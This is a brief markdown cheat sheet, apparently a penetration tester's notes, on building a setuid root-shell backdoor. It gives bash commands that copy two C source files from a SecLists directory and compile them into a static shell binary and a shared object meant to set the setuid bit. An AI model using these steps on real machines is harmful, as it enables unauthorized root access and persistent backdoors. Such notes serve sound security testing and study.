# C setuid suid backdoor exploit

## program to execute shell commands with system
```bash
cp /usr/share/seclists/Miscellaneous/source-code/c-linux/root-shell.c .
gcc -static -o root-shell root-shell.c
```

## write setuid bit to binary with SO shared module object
/usr/share/seclists/Miscellaneous/source-code/c-linux/drop-shell.c
```bash
cp /usr/share/seclists/Miscellaneous/source-code/c-linux/drop-shell.c .
gcc -fPIC -shared -o drop-shell.so drop-shell.c
```
